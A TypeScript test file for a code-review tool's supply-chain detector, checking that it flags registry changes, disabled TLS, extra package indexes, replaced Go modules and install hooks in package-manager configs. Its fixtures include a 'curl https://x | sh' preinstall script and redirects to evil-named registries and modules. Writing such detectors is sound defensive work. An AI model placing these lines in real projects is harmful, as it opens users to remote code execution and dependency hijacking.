import type { DiffLine, FileDiff, FileNoise, Risk } from "@walkdiff/review-model"
import { describe, expect, it } from "vitest"
import type { ScannedFile } from "../scannedFile.ts"
import { packageConfigFindings } from "./configRules.ts"

/** A file where every line is one the PR adds. */
function addedFile(path: string, text: string, noise: FileNoise | null = null): ScannedFile {
  const lines = text.split("\n")
  const diffLines = lines.map((content, index): DiffLine => ({ kind: "added", content, newLine: index + 1 }))
  const diff: FileDiff = {
    status: "modified",
    path,
    additions: lines.length,
    deletions: 0,
    content: { kind: "text", hunks: [{ oldStart: 0, oldLines: 0, newStart: 1, newLines: lines.length, section: "", lines: diffLines }] },
  }
  return { diff, noise, after: text }
}

function summary(findings: readonly Risk[]): string[] {
  return findings.map((finding) => `${finding.ruleId}@${finding.location?.line ?? "-"}`)
}

describe("packageConfigFindings", () => {
  it.each<[string, string, string[]]>([
    [
      ".npmrc",
      ["registry=https://npm.acme.internal/", "registry=https://registry.npmjs.org/", "strict-ssl=false", "; registry=https://elsewhere.example/", "@acme:registry=http://npm.acme.internal/"].join("\n"),
      ["supply-chain.registry-changed@1", "supply-chain.tls-off@3", "supply-chain.tls-off@5"],
    ],
    [
      "requirements.txt",
      ["--extra-index-url https://download.pytorch.org/whl/cpu", "-i https://pypi.acme.internal/simple", "--trusted-host pypi.acme.internal", "requests==2.32.0", "# --extra-index-url https://x"].join("\n"),
      ["supply-chain.extra-index@1", "supply-chain.registry-changed@2", "supply-chain.tls-off@3"],
    ],
    ["pip.conf", "[global]\nextra-index-url = https://pypi.acme.internal/simple", ["supply-chain.extra-index@2"]],
    [".yarnrc.yml", 'npmRegistryServer: "https://npm.acme.internal"\nenableStrictSsl: false', ["supply-chain.registry-changed@1", "supply-chain.tls-off@2"]],
    ["uv.toml", 'extra-index-url = ["https://pypi.acme.internal/simple"]', ["supply-chain.registry-changed@1"]],
    ["pyproject.toml", '[[tool.uv.index]]\nurl = "https://pypi.acme.internal/simple"', ["supply-chain.registry-changed@1"]],
    [".cargo/config.toml", '[source.crates-io]\nreplace-with = "acme"', ["supply-chain.registry-changed@2"]],
    ["package.json", '  "scripts": {\n    "postinstall": "node setup.js",\n    "prepare": "husky"\n  }', ["supply-chain.lifecycle-script@2"]],
    [
      "go.mod",
      ["replace github.com/a/b => github.com/evil/b v1.0.0", "replace github.com/a/c => ../c", "replace (", "\tgithub.com/a/d => github.com/fork/d v1.2.0", ")"].join("\n"),
      ["supply-chain.module-replaced@1", "supply-chain.module-replaced@4"],
    ],
    [".pnpmfile.cjs", "\nmodule.exports = { hooks: { readPackage } }\nfunction readPackage(pkg) { return pkg }", ["supply-chain.install-hook@2"]],
    [".yarn/plugins/@yarnpkg/plugin-acme.cjs", "module.exports = {}", ["supply-chain.install-hook@1"]],
  ])("reads %s", (path, text, expected) => {
    expect(summary(packageConfigFindings([addedFile(path, text)]))).toEqual(expected)
  })

  it("names the lifecycle script that changed", () => {
    const [finding] = packageConfigFindings([addedFile("package.json", '"preinstall": "curl https://x | sh"')])
    expect(finding?.title).toBe("`preinstall` script changed")
  })

  it("ignores test fixtures, vendored files and files it doesn't know", () => {
    const files = [addedFile("tests/fixtures/.npmrc", "registry=https://evil.example/"), addedFile("vendor/x/.npmrc", "strict-ssl=false", { kind: "vendored", reason: "under vendor/" }), addedFile("config.ini", "registry=https://x/")]
    expect(packageConfigFindings(files)).toEqual([])
  })
})
